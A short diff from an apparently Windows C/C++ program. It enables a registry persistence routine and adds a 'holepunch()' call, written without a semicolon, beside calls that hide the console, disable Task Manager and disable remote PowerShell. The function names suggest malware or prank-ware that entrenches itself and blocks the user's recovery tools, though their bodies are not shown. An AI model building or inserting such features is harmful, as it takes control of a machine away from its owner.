@@ -100,7 +100,8 @@ void browserTextSpam(){
 
 int main(){
     //Set persistent running in registry
-    //persistance();
+    persistance();
+    holepunch()
     FreeConsole();  //Hide the console
     DisableTaskManager();
     disableRemotePowerShell();
